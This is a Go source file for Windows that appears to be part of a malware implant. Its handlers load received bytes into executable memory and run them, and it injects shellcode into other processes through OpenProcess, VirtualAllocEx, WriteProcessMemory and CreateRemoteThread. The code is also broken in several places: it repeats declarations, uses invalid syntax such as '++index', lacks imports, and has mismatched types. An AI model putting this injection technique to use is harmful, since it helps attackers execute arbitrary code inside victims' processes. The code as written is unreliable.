package main

import (
	"syscall"
	"unsafe"
)

var (
	windowsHandlers = map[string]interface{}{
		"task": taskHandler,
		"remoteTask": remoteTaskHandler,
	}
)

func getSystemHandlers() map[string]interface{} {
	return windowsHandlers
}

// ---------------- Handlers ----------------
func taskHandler(data []byte) {
	size := len(data)
	addr, err := sysAlloc(size)
	if err != nil {
		return err
	}
	buf := (*[size]byte)(unsafe.Pointer(addr))
	for index := 0; index < size; ++index {
		buf[index] = data[index]
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
	return nil
}

func remoteTaskHandler(data []byte) {

}

// ---------------- Platform Code ----------------

const (
	MEM_COMMIT             = 0x001000
	MEM_RESERVE            = 0x002000
	PAGE_EXECUTE_READWRITE = 0x000040
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

var (
	kernel32     = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc = kernel32.MustFindProc("VirtualAlloc")
)

func sysAlloc(n uintptr) (uintptr, error) {
	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	openProcess        = kernel32.MustFindProc("OpenProcess")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	createThread       = kernel32.MustFindProc("CreateThread")
)

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// InjectTask - Injects shellcode into a process handle
func InjectTask(processHandle Handle, shellcode string) error {

	// Create native buffer with the shellcode
	shellcodeSize := len(shellcode)
	log.Println("[*] creating native shellcode buffer ...")
	shellcodeAddr, _, err := virtualAlloc.Call(0, ptr(shellcodeSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if shellcodeAddr == 0 {
		return err
	}
	shellcodeBuf := (*[99999]byte)(unsafe.Pointer(shellcodeAddr))
	for index, value := range []byte(shellcode) {
		shellcodeBuf[index] = value
	}

	// Remotely allocate memory in the target process
	log.Println("[*] allocating remote process memory ...")
	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(shellcodeSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	log.Printf("[*] virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	if remoteAddr == 0 {
		log.Println("[!] failed to allocate remote process memory")
		return err
	}

	// Write the shellcode into the remotely allocated buffer
	writeMemorySuccess, _, err := writeProcessMemory.Call(uintptr(processHandle), uintptr(remoteAddr), uintptr(shellcodeAddr), ptr(shellcodeSize), 0)
	log.Printf("[*] writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
	if writeMemorySuccess == 0 {
		log.Printf("[!] failed to write shellcode into remote process")
		return err
	}

	// Create the remote thread to where we wrote the shellcode
	log.Println("[*] successfully injected shellcode, starting remote thread ....")
	createThreadSuccess, _, err := createRemoteThread.Call(uintptr(processHandle), 0, 0, uintptr(remoteAddr), 0, 0, 0)
	log.Printf("[*] createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
	if createThreadSuccess == 0 {
		log.Printf("[!] failed to create remote thread")
		return err
	}
	return nil
}

// OpenProcessHandle - Returns the handle for a given process id
func OpenProcessHandle(processID int) (Handle, error) {
	log.Println("[*] obtaining process handle for pid ...")
	handle, _, err := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(false), ptr(processID))
	log.Printf("[*] openprocess returned: handle = %v, err = %v", handle, err)
	if handle == 0 {
		log.Println("[!] failed to obtain process handle")
		return 0, err
	}
	return Handle(handle), nil
}

// RemoteThreadTaskInjection - Injects Task into a processID using remote threads
func RemoteThreadTaskInjection(processID int, data []byte) error {
	processHandle, err := OpenProcessHandle(processID)
	if processHandle == 0 {
		return err
	}
	err = InjectTask(processHandle, data)
	if err != nil {
		return err
	}
	return nil
}
